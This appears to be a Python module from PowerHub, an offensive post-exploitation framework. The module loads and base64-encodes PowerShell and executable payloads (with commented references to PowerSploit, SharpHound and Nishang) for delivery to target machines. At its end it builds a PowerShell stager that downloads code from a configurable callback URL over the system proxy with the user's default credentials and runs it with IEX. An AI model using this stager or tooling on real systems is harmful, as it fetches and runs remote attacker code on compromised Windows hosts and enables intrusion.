from powerhub.args import args
from powerhub.settings import BASE_DIR
import os
import base64


def load_powershell_scripts(directory):
    result = []
    for dirName, subdirList, fileList in os.walk(directory):
        for fname in fileList:
            filename = os.path.join(dirName, fname)
            # remove tests from powersploit
            if "tests" not in fname and fname.endswith('ps1'):
                with open(filename, "br") as f:
                    d = f.read()
                result.append(Module(
                    filename.replace(os.path.join(BASE_DIR, 'modules'), ''),
                    "ps1",
                    base64.b64encode(d)))
    return result


def load_exe_files(directory):
    result = []
    for dirName, subdirList, fileList in os.walk(directory):
        for fname in fileList:
            filename = os.path.join(dirName, fname)
            if fname.endswith('exe'):
                with open(filename, "br") as f:
                    d = f.read()
                result.append(Module(
                    filename.replace(BASE_DIR, ''),
                    "ps1",
                    base64.b64encode(d)))
    return result


def import_modules():
    mod_dir = os.path.join(
        BASE_DIR,
        'modules',
    )

    if not os.path.exists(mod_dir):
        os.makedirs(mod_dir)

    ps_modules = load_powershell_scripts(os.path.join(mod_dir, 'ps1'))

    exe_modules = load_exe_files(os.path.join(mod_dir, 'exe'))

    return ps_modules + exe_modules


class Module(object):
    def __init__(self, name, type, code):
        self.name = name
        self.type = type
        self.code = code
        self.active = False

    def activate(self):
        self.active = True

    def deactivate(self):
        self.active = False

#  PowerSploit = Module(
#      "PowerSploit",
#      "https://github.com/PowerShellMafia/PowerSploit.git",
#  )
#
#  PowerSploitDev = Module(
#      "PowerSploit (dev branch)",
#      "https://github.com/PowerShellMafia/PowerSploit.git",
#      branch='dev',
#  )
#
#  BloodHound = Module(
#      "BloodHound Ingestor",
#      "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1", # noqa
#      proto='web',
#  )

#  Nishang = Module("https://github.com/samratashok/nishang")


modules = import_modules()

callback_url = '%s://%s:%d/%s' % (
    args.PROTOCOL,
    args.URI_HOST,
    args.URI_PORT,
    args.URI_PATH,
)


stager_str = (
    #  "[System.Net.ServicePointManager]::ServerCertificateValidationCallback #  = {$true};" if args.SSL else "" # noqa
    "$K=new-object net.webclient;"
    "$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
    "$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
    "IEX $K.downloadstring('%s');"
) % callback_url
